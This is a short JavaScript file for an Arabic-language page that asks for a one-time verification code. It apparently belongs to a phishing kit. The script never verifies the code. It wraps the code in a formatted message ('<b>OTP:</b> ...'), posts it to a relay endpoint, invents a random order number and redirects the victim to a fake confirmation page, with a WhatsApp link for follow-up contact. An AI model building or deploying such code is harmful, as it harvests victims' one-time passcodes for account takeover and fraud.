(function(){
    const $ = id => document.getElementById(id);
    const form = $('otpForm');
    const otp = $('otp');
    const loading = $('loading');
    const verifyBtn = $('verifyBtn');
    const whatsappBtn = $('whatsappBtn');
    const otpError = $('otpError');
    const yearEl = document.querySelector('#year');
    const WHATSAPP_URL = 'https://wa.me/message/I77OHUE4I7XSF1';
    if(whatsappBtn) whatsappBtn.href = WHATSAPP_URL;
    if(yearEl) yearEl.textContent = new Date().getFullYear();

  function normalizeDigits(str=''){
    const map={'٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9','۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9'};
    return (str+'').replace(/[٠-٩۰-۹]/g, d => map[d] || d);
  }

    if(otp) otp.addEventListener('input',()=>{ if(otpError) otpError.style.display='none'; });

    form.addEventListener('submit', async function(e){
      e.preventDefault();
      const code = normalizeDigits(otp.value).replace(/\D+/g,'');
      if(!code){
        if(otpError){
          otpError.textContent='يرجى إدخال رمز التحقق';
          otpError.style.display='block';
        }
        return;
      }
      if(otpError) otpError.style.display='none';
      loading.style.display='block';
      verifyBtn.disabled=true;
      const orderId = Math.floor(100000 + Math.random()*900000);
      try{
        const res = await fetch('/api/submit', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ payload:`<b>OTP:</b> ${code}` })
        });
        if(!res.ok) throw new Error('Bad response');
        window.location.href = 'confirmation.html?order=' + orderId;
      }catch(ex){
        console.error(ex);
        if(otpError){
          otpError.textContent='تعذر إرسال الرمز، حاول مرة أخرى';
          otpError.style.display='block';
        }
      }finally{
        loading.style.display='none';
        verifyBtn.disabled=false;
      }
    });
    })();
